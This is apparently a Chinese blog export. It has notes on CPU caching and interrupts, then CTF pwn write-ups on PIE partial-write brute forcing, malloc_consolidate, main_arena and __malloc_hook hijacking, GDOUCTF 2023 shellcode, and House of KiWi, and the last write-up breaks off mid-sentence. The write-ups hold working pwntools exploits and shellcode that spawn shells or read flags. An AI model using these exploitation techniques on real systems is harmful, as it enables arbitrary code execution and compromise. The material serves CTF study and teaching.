&#125;&#125;\n\n当括号中的判断式为true的概率大时 就使用likely宏\n与此同时 我们前面提高过 每个cpu核心都有自己的L1 L2 cache 数据会被优先放到这两个cache中存放 方便cpu调用\n但是 如果是单核cpu的话 只能执行一个线程 但是系统给多个需要被执行的线程分配时间片 每个线程执行一段时间后 就执行另外一个线程 所以看起来就好像所有的线程都在同时执行一样\n但是现在的cpu基本都是多核心的 这也就意味着线程可能会在多个核心中执行 这就导致了缓存命中率的问题\n上述所提到的cache和内存的数据交互 只是cache单方面写入内存的数据 如果cpu要执行b &#x3D; a+1的操作呢?\n那么就需要将cache的数据b写回到内存 这一操作是怎么实现的 下面我们就来讲两种写入数据的办法 分别是写直达和写回\n写直达:\n这一种办法是最简单粗暴的 也就是连同cache和内存 一起写入数据\n流程为 先判断cache中是否有需要被写入的数据 如果有 就先写入cache 再写入内存\n如果没有 就直接写入内存\n这种办法的逻辑简单 比较浪费cpu的执行时间 因为每次写入都需要访问内存\n写回:\n写回办法有效解决了前者出现的问题\n当要进行写操作的时候 先判断cache是否已经有对应数据了   如果有的话 则更新数据到cache中 并且把数据标记为脏的\n如果cache中是其他内存地址的数据的话 先判断这个数据是不是脏的 如果是脏的 那么先将该数据写回到内存中\n再从内存中将需要用到的数据写到cache 再覆写cache中的数据 并且标记为脏的 之所以这样做可以看\ncaching - For Write-Back Cache Policy, why data should first be read from memory, before writing to cache? - Stack Overflow\n如果不是脏的话 就只要将需要的数据从内存中写入到cache 再覆写cache 最后标记为脏的\n这样下来 就不需要每次写操作都需要访问内存\n你可能会觉得 那这样就无法及时的写回内存 但是如果我们的缓存命中率高的话 就不需要频繁的与内存交互\n我们一直提到缓存命中率 这是对于同一个核心而言的 如果一个线程由两个核心执行呢\n一个计算式:\na=b=0   //1a += 1  //2b += 1  //3a += b  //4\n\n如果核心A负责式子2和4  核心B负责式子3\n接下来注意了 两个核心读入数据到cache中时 读入的都是初始值 对于两个核心来说 a,b最开始的值都是0\n核心A执行完式子2了以后 按照上文的写回操作 并不会马上将数据写回到内存中 \n接下来核心A执行式子4的时候 其和核心B执行的式子3 并没有关联 对于核心A来说 变量a是1 变量b是0\na最后的值是1 但是对于上帝视角的我们来说 最后的结果应该是2 这就是核心A和B的信息差导致的后果 称这种问题为缓存一致性\n为了解决这种问题的出现 就需要一种机制来协调不同核心间的cache \n也就是当核心A将变量a赋值为了1时 需要通知其他核心的cache 将a同样重新赋值 相当于广播 这种方式称为总线嗅探\n这种行为称为写传播 但是光这样还是不足以平衡不同核心之间的信息差 当核心A对于变量a多次赋值 第一次赋值为10 第二次赋值为20\n假设核心B接收到的广播顺序是先20再10 那么显然最后变量a在两个核心中的值还是不同 也就需要统一对数据的操作顺序\n这种行为称为事务的串行化 当接收到广播后 只有拥有&lt;锁&gt;才能对这个数据的赋值进行修改\n要想同时实现事务串行化和写传播 并且优化每次写传播都需要对所有核心广播的问题\n诞生了MESI协议 MESI协议包括了四种状态 分别是 已修改 独占 共享 已失效\n已修改: 即我们前面提到的脏标记 意味着此时该数据在cache和内存中不一样\n独占&#x2F;共享:二者的定义是对于cpu核心而言的 即该数据是否为单个cpu核心所独占 如果处于独占状态 那么写入数据后就不需要写传播\n如果处于共享状态 先经过写传播 将其他核心内的数据修改成无效状态 再重新写入数据\n已失效: 代表该数据不能被调用 \nMESI协议的共享机制存在着伪共享的问题 \n\n此时核心A和核心B分别负责线程A(a +&#x3D; 1)  线程B(b +&#x3D; 1)\n而变量a和b相邻 位于同个cache line范围中 所以此时核心A和核心B的cache line拥有同样的变量 变成共享状态\n此时 核心A开始执行线程A 发现其处于共享状态 于是通过总线将核心B的cache line修改为已失效状态 随后进程A结束后 核心A的cache line变化已修改状态\n核心B开始执行线程B 发现cache line处于失效状态 于是将拥有和其一样变量的核心A的cache line写回到内存 再从内存中重新读入cache line 随后执行完线程B以后 将新cache line设置为已修改状态 而此时核心A的cache line处于已失效状态\n如果核心A和B不断重复各自的线程 实际上就是不断重复上述的操作 频繁的和内存进行交互 cache line的用处微乎其微 这就是伪共享问题\n想要解决这一问题 linux内核提供了__cacheline_aligned_in_smp的宏定义\n对于该定义 仅使用于多核cpu 下面举例一个程序\n#include&lt;stdio.h&gt;int main()&#123;    int a;    int b;&#125;\n\n\n\n此时变量a和b在内存地址上是相邻的 如果将变量b用上__cacheline_aligned_in_smp宏定义\n#ifdef CONFIG_SMP#define __cacheline_aligned_in_smp __cacheline_aligned#else#define __cacheline_aligned_in_smp#endif#include&lt;stdio.h&gt;int main()&#123;    int a;    int b __cacheline_aligned_in_smp;&#125;\n\n此时b的地址就被设置为cache line的对齐地址\n\n但是这种方法实际上是浪费了一部分cache line的空间 来换取效率的提升\n接下来我们来讲一下进程和线程的一点知识 为了接下里要讲的软中断做铺垫\n每一个进程都有自己独立的内存空间 一个进程可以拥有多个线程 在windows系统中 可以使用任务管理器来查看当前的进程\n\n其中 一个进程可以拥有多个线程\n在linux系统中 线程可以被视为一个轻量化的进程 也就是说线程也是被作为一个进程看待\n而在JVM(java为了实现跨平台而创建的一个假想计算机)中的线程 拥有自己的程序计数器 虚拟机栈 本地方法栈\n这里不额外扩展 感兴趣的可以自行了解\n进程是操作系统资源分配的基本单位 而线程是处理器任务调度和执行的基本单位\n每一个线程都有自己的独立运行栈和程序计数器  并且共享代码和数据空间\n线程也不能自己独立执行 必须依附于应用程序 也就是进程中\n当有一个线程崩溃掉 整个进程都会崩溃掉 \n相比之 进程拥有独立的代码和数据空间 进程之间的切换会消耗挺大的开支\n一个进程崩溃后 在保护模式下不会对其他进程造成影响\n接下来我们来讲软中断 首先要明白什么是中断\n举一个例子 在日常生活中 你正在打原神 这时候你接到了你的外卖电话 由于你的学习福建师范大专偷外卖的人很多 你不马上下楼拿就会不见 所以你立刻中断了打原神的操作 下楼去拿外卖\n其中 打原神就是一个进程 拿外卖又是一个进程 从打原神向拿外卖的一个执行转化 就是中断\n对于计算机来说 中断是一个异步的事件处理机制 可以有效于提高系统的并发处理能力\n负责相应中断请求的是中断处理程序 其在相应中断请求的时候 可能还会临时关闭中断 这是什么意思呢\n还是接着上面的例子 当我们下楼拿外卖的时候 原神突然发放福利1w原石 但是需要玩家动手领取 这时候你下楼去拿外卖了 也就无法相应这个福利 你就和原石擦肩而过\n本来计算机需要相应两次中断 一次拿外卖 一次领福利 但是由于中断处理程序还在执行第一次中断 无法及时相应第二次中断 就丢失了一次中断\n那么软中断是什么呢? 其讲一次中断请求分为了两个部分 第一部分用于快速响应中断 直接处理硬件请求 为硬中断\n第二部分用于处理第一部分还没有完成的事情 通常是时间较长的事情 为软中断\n如何理解呢? 举个例子\nA要和你聊事情 约你在一个地方见面 没有分为软中断和硬中断的话 A会和你一直保持通话 期间如果其他人要找你就没有办法响应\n如果有软中断的话 就是和A迅速约定好见面地点和时间  然后挂断电话 等待其他人给你打电话  随后你可以面对面询问A遇到什么问题\n","categories":["基础"]},{"title":"简单爆破partial write","url":"/2022/10/06/%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4partial-write/","content":"原理分析本篇介绍ret2text的一种特殊情况\n先前我们学习过的是没有pie的情况下 这时候我们backdoor函数的地址清清楚楚\n我们可以直接栈溢出覆盖 控制程序执行流 但是如果开了pie呢？\n这样的话后门函数的地址就随机化了 我们通过ida只能得知其与基址的偏移\n\n如上图所示 这样的情况下 我们又该如何得知backdoor函数的真实返回地址呢？\n不知道你还记不记得我们曾经讲过虚拟内存分页机制\n其导致了基址的后三位一定为000 所以函数的地址后三位保持不变 不会因为pie的开启而变化\n所以：\n我们假设程序的基址是0xfffffffffffff000\n那么函数的偏移是0x0000 其除了后四位 其他位和基址是一样的(不排除进一的情况)\n而程序正常结束后的ret 其地址也是基址+偏移得到的\n所以，我们在已经直到后三位的情况下 要想得知后门函数的真实地址 只需要爆破倒数第四位 就可以试出来了\n真题解析\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  puts(&quot;Do you konw ret2text?&quot;);  puts(&quot;It&#x27;s a easy challenge&quot;);  vuln();  puts(&quot;You failed.&quot;);  return 0;&#125;\n\n__int64 vuln()&#123;  char buf[256]; // [rsp+0h] [rbp-100h] BYREF  read(0, buf, 0x140uLL);  return 0LL;&#125;\n\nint backdoor()&#123;  return system(&quot;/bin/sh&quot;);&#125;\n\n最简单的栈溢出到后门函数 唯一不同的是开启了pie需要爆破倒数第四位的地址\n直接上exp吧\nfrom pwn import*def exploit():    io = remote(&quot;43.143.7.97&quot;,28774)    io.recvuntil(&quot;It&#x27;s a easy challenge&quot;)    payload = cyclic(0x100+0x8)    payload += p16(0x11e2)    io.send(payload)    io.recv()    io.sendline(&quot;cat flag&quot;)    result = io.recv(timeout=1)    io.interactive()if __name__ == &#x27;__main__&#x27;:    try_count = 0    while(True):        try:            exploit()        except:            try_count += 1            print(&quot;failed :&#123;&#125;&quot;.format(try_count))\n\n这里你会发现后三位的地址有点不一样 后门函数的后三位是1DD 但是exp上写的是1e2\n这里是栈对齐的问题 因为开启了pie 又没办法泄露基址 所以我们无法获得ret的汇编地址\n这里看一下汇编代码 就比较好理解了\n\n我们相当于是跳过了push rbp这一指令 因为此时的rbp已经被我们填入的垃圾数据覆盖了 如果这时候将rbp入栈\n就会破坏原有的栈结构 至于为什么在没有开启pie的ret2text的题目中不用注意这一点 只能解释说这是pie特有的需要注意的情况\n","categories":["栈"]},{"title":"malloc_consolidate利用","url":"/2023/04/11/malloc-consolidate%E5%88%A9%E7%94%A8/","content":"比较强大的一个漏洞  触发的条件很常见 但是效果却很强大 在做NKCTF2023的时候作为压轴题考察了 后来才知道是原题 heapstorm zero\nmalloc_consolidate()核心的利用就是依靠这个函数 这个函数有两种作用 第一是可以合并fastbinchunk 第二个是对于堆进行初始化\n在学习fastbin中 我们知道 chunk被释放到fastbin后 其next chunk的Inuse位是不会被置零的\n\n也就不会存在合并chunk这种利用方法\n但是malloc_consolidate函数却可以实现合并fastbin的效果 按照上图的情形 此时触发malloc_consolidate函数 chunk0就会被放入到unsortedbin中 随后根据大小分配到smallbin中\n\n我们先来讲其实现逻辑 触发条件稍等讲\nif (get_max_fast () != 0) &#123;  ...&#125;else &#123;  malloc_init_state(av);  check_malloc_state(av);&#125;\n\n函数开始执行时 会对于get_max_fast ()的返回值进行判断 如果进程是第一次调用malloc函数时 其返回值为0 此时就会进行堆初始化工作\n如果堆已经初始化完成 此时会调用clear_fastchunks函数清空fastbin的Inuse位\n接着会进行一个嵌套循环 第一次循环遍历fastbin数组 得到链表 随后遍历链表 得到free chunk\n/*  Remove each chunk from fast bin and consolidate it, placing it  then in unsorted bin. Among other reasons for doing this,  placing in unsorted bin avoids needing to calculate actual bins  until malloc is sure that chunks aren&#x27;t immediately going to be  reused anyway.*/maxfb = &amp;fastbin (av, NFASTBINS - 1);fb = &amp;fastbin (av, 0);do &#123;  p = atomic_exchange_acq (fb, NULL);  if (p != 0) &#123;do &#123;  check_inuse_chunk(av, p);  nextp = p-&gt;fd;...&#125; while ( (p = nextp) != 0);  &#125;&#125; while (fb++ != maxfb);\n\n对于合并来说 首先是考虑向后合并 这里的向后合并指的是向低地址处\n顺便复习一下向后合并的条件 \n其会对当前chunk的Inuse位进行判断 是否可以和物理相邻低地址处的chunk合并 接着通过prev_size位来索引prev_chunk的地址\n修改其size为合并后的总和 随后让chunk进入unlink函数\n常见的就是topchunk合并  图例下面一并讲\n随后进入向前合并的分支 首先判断物理相邻高地址处的chunk是否为top chunk\n如果为top chunk 则top chunk直接触发向后合并 如下所示布局堆\nadd(0x10)delete(0)malloc_consolidate()\n\n\n如果nextchunk不为top chunk的话 则正式进入向前合并\n/* consolidate forward */if (!nextinuse) &#123;    unlink(av, nextchunk, bck, fwd);    size += nextsize;&#125; else    clear_inuse_bit_at_offset(nextchunk, 0);\n\n首先先索引到nextchunk 再索引到nextchunk的nextchunk 根据其的Inuse位来判断是否nextchunk被释放 如果被释放 如下图所示\n\n那么就会合并chunk0和chunk1 \n\n如何触发malloc_consolidate函数的强大功能我们上面已经了解到了 利用这一函数 可以轻松的获取smallbin或者largebin中的chunk \n对于有些题目来说 其会对申请chunk的size进行限制 利用这一函数就可以绕过限制 仍然获得释放chunk到这两个bin中的机会\n首先我们要知道 c语言中的标准输出和标准输入和标准错误都有着缓冲区 只不过其各自遵守的缓冲区原则不同\n具体的可以去看我相关博客 这里只需要知道 哪怕大部分的程序都会将缓冲区设置为无缓冲模式 但是如果scanf函数一次性读入过多的字符串 其还是会调用malloc申请一个大chunk\n而很多堆题 鉴于出题人的出题习惯或者是疏忽 在菜单页时选择的选项是由scanf函数来的\n\n这也解决了我刚学堆时的疑问 为什么大部分都要用到atoi函数来中转 而不选择scanf直接读\nio.recvuntil(&quot;&gt;&quot;)io.sendline(b&#x27;1&#x27;*0x1000)\n\n就以这题举例 此时利用scanf读入0x1000字节的‘1’\n在此之前 没有进行任何的malloc调用 理论来说 此时heap应该还没有被初始化 但是在gdb中 我们是可以索引到top chunk的\n\n接着来查看一下top chunk的内容 可以看到都是1\n\n也就是说其申请了一个大chunk用来存放过多的字符串 随后释放到bin中和top chunk合并了\n通过这个办法 就可以调用到malloc_consolidate 不过具体的调用流程我也不清楚 尝试过源码调试 但是也不知道打断点在哪里\n怎样利用可以用来利用的点 一个是刚才提到的 有些题目会对chunk的大小进行限制 从而没有办法释放chunk到unsortedbin 泄露libc基址 利用这种办法 只要是可以释放到fastbin中的chunk 都能进入unsortedbin\n第二点 还需要一个特性相辅相成 不知道你有没有留意 在我们先前讲到的向前合并或者是向后合并 其是如何索引prev_chunk和next_chunk的呢 无非就是利用chunk头的那两个数值 size域就不动什么歪脑经了 修改后整个heap结构都会变化 那么目标自然是放在prev_size上了\n你可能会想到利用堆溢出来覆盖prev_size 这个办法自然可行 不过我们先来观察一下利用malloc_consolidate形成的smallbin chunk\nfor i in range(11):    add(0x18)  #0 - 10for i in range(0,10):    delete(i)bigchunk()\n\n\n\n可以看到 虽然其合并成了一个0x140大小的chunk 但是在其内部 实际上还保留着原本chunk各自的size 并且size的值也可以表明是向后合并\n基于这种数值的残留 存在着chunk overlap 下面跟着我一步步来看如何实现\nfor i in range(11):    add(0x18)  #0 - 10for i in range(1,10):    delete(i)bigchunk()payload = cyclic(0x18)+p64(0x100)edit(0,len(payload),payload)\n\n此时的堆结构如图所示\n\n可以看到此时的smallbin已经被拆分成蓝框中的两个chunk了 我们利用chunk0溢出将chunk1的size域修改为0x100后 由于0xe4b020处残留着代表0x20大小的chunk头 所以形成了上图的情形\n这样做的目的何在呢  可以看到此时最后一个chunk的prev_size为0x120 如果我们将其释放后 再利用malloc_consolidate就会索引到smallbin中的chunk 从而触发向后合并\n\n这样做的用意在于保留堆块指针 获得chunk overlap\nadd(0x38)#11add(0x38)#12add(0x38)#13   0xa0add(0x38)#14   0xe0\n\n此时我们再次申请四个0x38大小的chunk\n\n此时将smallbin瓜分完毕 随后我们释放前两个chunk 并且将其释放到smallbin中(其实一个也行 只要构造一个smallbin就行了 无关大小)\n\n如果我们此时释放0x1ad4140这个chunk  其prev_size也就是0x120 索引到的就是smallbin 就会和其合并 从而中间的两个chunk的指针就会保留下来 如果我们再次申请 就会成功chunk overlap\ndelete(10)bigchunk()\n\n\n完整:\nfor i in range(11):    add(0x18)  #0 - 10payload = cyclic(0x10)+p64(0x100)edit(8,len(payload),payload)for i in range(1,10):    delete(i)bigchunk()payload = cyclic(0x18)+p64(0x100)edit(0,len(payload),payload)add(0x38)#11add(0x38)#12add(0x38)#13   0xa0add(0x38)#14   0xe0delete(11)delete(12)bigchunk()delete(10)bigchunk()\n\nps: 大部分利用到这样攻击手法的 都没有堆溢出或者是UAF 所以上述的一些操作只是我为了方便演示 受限于情况需要另说 比如覆盖size域就可以通过off by null\n","categories":["堆"]},{"title":"main_arena利用","url":"/2023/04/11/main-arena%E5%88%A9%E7%94%A8/","content":"配合fastbin的一种攻击办法 fastbin主要是受限于size域的检测不能随便任意写 main_arena的存在弥补了这一缺点 下面来详细介绍一下\nmain_arena源码分析struct malloc_state&#123;  /* Serialize access.  */  __libc_lock_define (, mutex);   /* Flags (formerly in max_fast).  */  int flags;   /* Set if the fastbin chunks contain recently inserted free blocks.  */  /* Note this is a bool but not all targets support atomics on booleans.  */  int have_fastchunks;   /* Fastbins */  mfastbinptr fastbinsY[NFASTBINS];   /* Base of the topmost chunk -- not otherwise kept in a bin */  mchunkptr top;   /* The remainder from the most recent split of a small request */  mchunkptr last_remainder;   /* Normal bins packed as described above */  mchunkptr bins[NBINS * 2 - 2];   /* Bitmap of bins */  unsigned int binmap[BINMAPSIZE];   /* Linked list */  struct malloc_state *next;   /* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  */  struct malloc_state *next_free;   /* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  */  INTERNAL_SIZE_T attached_threads;   /* Memory allocated from the system in this arena.  */  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;; \n\nglibc中的arena就是基于malloc_state这个结构体表示的 其大部分都无需我们深入了解 \n有两个部分值得我们重点关注和利用\nfastbinsY数组和top指针\n\n可以看到 此时蓝框中的内容和fastbin链表上链表尾的chunk是一致的\n同时红框代表的是top chunk的addr\n实际利用我们知道 限制fastbin attack任意写的根本在于size域的检测 但是利用fastbin链表头对于main_arena的影响不知道你有没有什么思路\n如果我们利用double free 将原本的ptr_addr改为size 就可以达到满足size域的检测\nadd(0x10)add(0x10)delete(0)delete(1)delete(0)add(0x10)edit(2,8,p64(0x21))add(0x10)add(0x10)\n\n\n此时用同样的方法 就可以获取到main_arena的chunk\nlibc_addr = gift()add(0x10)#0add(0x10)#1delete(0)delete(1)delete(0)add(0x10)#2edit(2,8,p64(0x31))add(0x10)#3add(0x10)#4add(0x20)#5add(0x20)#6main_arena_addr = libc_addr + (0x7f62971c4b20-0x7f6296e00000)delete(5)delete(6)delete(5)add(0x20)#7edit(7,8,p64(main_arena_addr))add(0x20)#8add(0x20)#9add(0x20)#10\n\n为了方便调试 所以libc基址我的调试程序自带了一个函数提供\n\n可以看到 此时的main_arena满足了申请一个0x20大小的chunk 于是我们的chunk10就劫持了这片区域\n当然光靠这些当然攻击效果不显著 我们的目标是任意写 不知道你还记不记得正常分配一个chunk是如何进行的\nchunk初始化后 如果bin中没有合适的chunk 那么就是通过分割top chunk来分配 而你还记不记得 top chunk的起始地址是存放在main_arena中的 如果我们把其覆盖为ptr_addr 就可以达到任意写的目的\n并且通过上述的办法 我们已经获得了在main_arena上申请chunk的能力 只需要对上述的size进行扩大 使其能够覆盖到top chunk即可 如果题目对于chunk的大小进行了限制 仍然可以通过套娃的办法来延申可控制的范围\nlibc_addr = gift()add(0x10)#0add(0x10)#1delete(0)delete(1)delete(0)add(0x10)#2edit(2,8,p64(0x81))add(0x10)#3add(0x10)#4add(0x70)#5add(0x70)#6main_arena_addr = libc_addr + (0x7f62971c4b20-0x7f6296e00000)delete(5)delete(6)delete(5)add(0x70)#7edit(7,8,p64(main_arena_addr))add(0x70)#8add(0x70)#9add(0x70)#10malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]payload = p64(0)*9 + p64(malloc_hook-0x10)edit(10,len(payload),payload)add(0x20)#11onegadget_addr = libc_addr + 0x4527aedit(11,8,p64(onegadget_addr))add(0x20)#12io.interactive()\n\n这里的chunk10就是控制main_arena上的top chunk\n此时再次申请一个chunk11 获得的就是malloc_hook处的空间 但是不知道为啥0x10大小的chunk貌似不行 有待研究\n随后就是触发onegadget获得shell 上述的exp属于有很多漏洞的题目  具体题目需要用到这种办法还需要自己研究\n总结一下还是比较简单的一个小tip\n","categories":["堆"]},{"title":"GDOUCTF2023","url":"/2023/04/17/GDOUCTF2023/","content":"这次的pwn出的比较简单 也就最后一题值得拿来说一说 但是其本质也就是非常简单的手写shellcode\nRandom\n保沙盒护基本全关了  但是开启了沙盒  ida看一下伪代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  unsigned int v3; // eax  int v5; // [rsp+0h] [rbp-10h] BYREF  int v6; // [rsp+4h] [rbp-Ch]  int v7; // [rsp+8h] [rbp-8h]  int i; // [rsp+Ch] [rbp-4h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  v7 = 100;  sandbox();  v3 = time(0LL);  srand(v3);  for ( i = 0; i &lt; v7; ++i )  &#123;    v6 = rand() % 50;    puts(&quot;please input a guess num:&quot;);    if ( (unsigned int)__isoc99_scanf(&quot;%d&quot;, &amp;v5) == -1 )      exit(0);    if ( getchar() != 10 )      exit(1);    if ( v6 == v5 )    &#123;      puts(&quot;good guys&quot;);      vulnerable();    &#125;    else    &#123;      puts(&quot;no,no,no&quot;);    &#125;  &#125;  return 0;&#125;\n\n考察了一个伪随机数 用时间当种子 对的话就进入vulnerable函数  伪随机数考烂了都 这里就不讲了\n直接来看vulnerable函数\nssize_t vulnerable()&#123;  char buf[32]; // [rsp+0h] [rbp-20h] BYREF  puts(&quot;your door&quot;);  return read(0, buf, 0x40uLL);&#125;\n\n当纯的一个栈溢出漏洞  不过观察了函数表  还发现了个haha函数 里面有一个jmp rsp指令\n.text:000000000040094A haha            proc near.text:000000000040094A ; __unwind &#123;.text:000000000040094A                 push    rbp.text:000000000040094B                 mov     rbp, rsp.text:000000000040094E                 jmp     rsp.text:000000000040094E haha            endp\n\n那么很明显了  没有开启NX保护机制  再加上有jmp rsp 就可以实现手写shellcode的一次执行\njmp指令实际上就是将rip指针跳转到rsp指针指向的地址\n我们的jmp rsp指令覆盖的是ret addr shellcode是在retaddr的下一个字长处 此时ret指令弹出jmp rsp到rip寄存器中 rsp指针+8\n也就指向了shellcode的起始地址 从而jmp rsp将rip寄存器指向shellcode的起始地址\n接着就是如何构造shellcode了  既然没有开启NX保护 又开启了沙盒 想直接获取shell显然是行不通了 \n只能通过orw的办法 这里有两种实现的逻辑 一种是采用shellcode的orw 一种是构造rop链的orw\n不过显然后者的利用更加麻烦 需要更多的步骤 于是这里采用前者\n对于第二次shellcode要写在哪里  这里遇到了个小问题 在比赛的时候采用的是ubuntu18的机子 libc文件采用的是本地的libc\nvmmap查看到的内存空间中 0x601000到0x602000这一个页是有rwx权限的  可以供我们存放第二次shellcode\n\n不过编写这次的wp的时候采用的是ubuntu20的机子 哪怕我把libc更换成了ubuntu18同款 但是0x601000到0x602000却没有可执行权限\n\n也是非常神奇 既然这样就采用原本做题的时候废弃的一个解法 在栈上写第二次shellcode 比赛的时候第一次的exp也是这种做法 不过最后因为远程和本地的libc差异导致偏移不同 最后也没有打通 不过本地复现重要的是掌握这题的知识点 所以倒也无所谓\nshellcode = &quot;&quot;&quot;xor eax,eaxshl edx,12syscallsub rsp,0x30jmp rsp&quot;&quot;&quot;\n\n首先设置异或清空eax寄存器 随后利用shl逻辑左移 扩大edx的值 随后syscall 调用read函数\n此时read函数写入数据的地址和rsp指针指向的地址 我们来查看一下\n\n可以看到差值是0x30 如果我们在执行完read以后 把rsp指针往低地址处挪动 随后再来一句jmp rsp 就可以执行第二次shellcode 第二次shellcode也就是为了达到orw效果\nshellcode = asm(&#x27;&#x27;&#x27;    push 0x67616c66    mov rdi,rsp    xor esi,esi    push 2    pop rax    syscall    mov rdi,rax    mov rsi,rsp    mov edx,0x100    xor eax,eax    syscall    mov edi,1    mov rsi,rsp    push 1    pop rax    syscall    &#x27;&#x27;&#x27;)\n\n剩下的就没什么好说了\n完整exp:\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()seed = libc.time(0)libc.srand(seed)io.recvuntil(&quot;please input a guess num:&quot;)buf = libc.rand()%50io.sendline(str(buf))io.recvuntil(&quot;your door&quot;)shellcode = &quot;&quot;&quot;xor eax,eaxshl edx,12syscallsub rsp,0x30jmp rsp&quot;&quot;&quot;jmp_rsp = 0x000000000040094epayload = cyclic(0x28)+p64(jmp_rsp)+asm(shellcode)gdb.attach(io,&#x27;b *0x400949&#x27;)pause(0)io.send(payload)shellcode = asm(&#x27;&#x27;&#x27;    push 0x67616c66    mov rdi,rsp    xor esi,esi    push 2    pop rax    syscall    mov rdi,rax    mov rsi,rsp    mov edx,0x100    xor eax,eax    syscall    mov edi,1    mov rsi,rsp    push 1    pop rax    syscall    &#x27;&#x27;&#x27;)io.send(shellcode)pause()\n\n","categories":["wp"]},{"title":"House of KiWi","url":"/2023/04/18/House-of-KiWi/","content":"一种基于setcontext来在开启沙盒的堆题中实现orw的利用链\n对于libc2.29以后的版本 setcontext控制rsp寄存器的值由rdi寄存器转化为了rdx寄存器\n相比之很容易控制的rdi寄存器 rdx寄存器要想修改为我们预期的值 还是比较麻烦的\n我们之前有提到的一种办法是利用libc文件中可以借rdi寄存器来控制rdx寄存器  但是今天这条链可以直接控制rdx寄存器\n下面就来学习一下 \n实现逻辑分析整条链的实现逻辑主要是基于fflush(stderr)这个函数的调用\n\n函数的内部调用了_IO_file_sync函数  并且其rdx寄存器的值恒为 _IO_helper_jumps由图上我们很容易能看出IO_file_sync函数的调用是基于rbp寄存器的寻址 而rbp寄存器的值恒为IO_file_jumps 所以如果我们能够修改其地址+0x60处为setcontext 即可 并且rdx寄存器此时的值也被我们熟知 如果我们修改其+0xa0和0xa8处为相对的地址 就可以达到劫持程序执行流的目的（setcontext部分的知识本文不会重复介绍）\n问题在于如何调用到fllush函数  \nstatic void__malloc_assert (const char *assertion, const char *file, unsigned int line,       const char *function)&#123;(void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n&quot;,           __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,           file, line,           function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,           assertion);fflush (stderr);abort ();&#125;\n\nassert是一个断言函数 实际作用和if差不多 起到判断的作用 通过调用assert函数可以涉及到__malloc_assert函数的调用\n所以此时我们的目标转化为调用assert函数\n一共有两种办法 一种是基于top chunk 一种是基于largebin chunk\n通过top chunk先来讲前者\n我们知道 对于小于阈值的chunk 如果bin中没有合适的chunk 就会从top chunk中分割来分配\n如果申请的chunk大小比top chunk大呢 这种情况top chunk就会调用sysmalloc函数\n在这个函数中 存在着对于assert的调用\nassert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;         prev_inuse (old_top) &amp;&amp;         ((unsigned long) old_end &amp; (pagesize - 1)) == 0));\n\n我们来进行源码调试 这样可以更好的理解这个判断式\n\n转化为汇编形式 实际上就是对应着这四个判断 只有成功跳转到sysmalloc+1829 &lt;sysmalloc+1829&gt; 才能够触发__malloc_assert函数\n首先第一个cmp判断  对比r14寄存器的值和rsp+8处的内容\n\n显然前者小于后者 并且这个判断式是固然的 不会因为用户的操作而改变(常规情况下)\n此时ZF标志位为0 jnz跳转\n第二个cmp判断 对比r12寄存器和0x1f 这里的0x1f实际上也就是最小chunk大小-1 用来判断top chunk剩余的size还够不够组成一个chunk\n此时r12寄存器的值为\n\n这个值其实不是固定的 还得根据你覆盖top chunk的size来决定 比如此时我覆盖top chunk的size就是0x100\n如果我们此时就覆盖top chunk的size小于0x1f 那么CF标志位就会被设置为1\njbe就会跳转  不过这样就看不到第三个判断式了 所以我并未选择在此处跳转 我们来看一下第三个判断\n利用test指令将al寄存器与1进行与运算 如果al寄存器的值为1 那么与运算的结果为1 ZF寄存器为0\n此时je也不会跳转 al寄存器是ax寄存器的低8位 而ax寄存器是eax寄存器的低16位 eax寄存器是rax寄存器的低32位\n所以此时al寄存器的值差不多就是size域的Inuse位吧 差不多可以这么理解  这里其实Inuse位设置为0就能跳转了 但是同上对吧 我还需要演示第四个判断\n首先是利用lea 赋值r13-1给rax\n随后test 把r11和rax进行与运算\n\n\n这里的rax固定是0x1000-1 0x1000是一页的大小 r11则为top chunk的首地址\n其实这里的与运算结果是必定不为0的 ZF标志位为0 jne跳转\n上面的四个判断 总结下来 其实只要我们覆盖top chunk的size域 使其大小不足以分配我们申请的大chunk即可  就能进入__malloc_assert函数 不需要像网上其他教程所说的一定要修改Inuse位\n通过largebin chunk&#123;              victim_index = largebin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;              /* maintain large bins in sorted order */              if (fwd != bck)                &#123;                  /* Or with inuse bit to speed comparisons */                  size |= PREV_INUSE;                  /* if smaller than smallest, bypass loop below */                  assert (chunk_main_arena (bck-&gt;bk));\n\n主要是通过这段源码中的assert函数  触发的条件是释放一个chunk到largebin中\n并且对应链表中已经存在一个chunk  还是来源码调试 看一看需要满足什么样的判断才能进入__malloc_assert函数\n\n将r12+8赋值给rax 此时r12的值为链表中已经存在的chunk的首地址 +8处则为size域\n接着将al寄存器和4进行与运算\n此时al寄存器的值为size域的最后一个字节 此时我的值为0x25\n这里可能存在疑问 为什么是5结尾 常规的chunk不是根据Inuse位有所不同吗 但也仅仅只是0和1\n这里是因为要想和4进行与运算后 ZF标志位为0 使得jnz能够跳转 就需要相应的倒数第三位值为1 才能满足条件\n而倒数第三位为1也就是增加了4 所以此时在0x21的基础上需要加上4 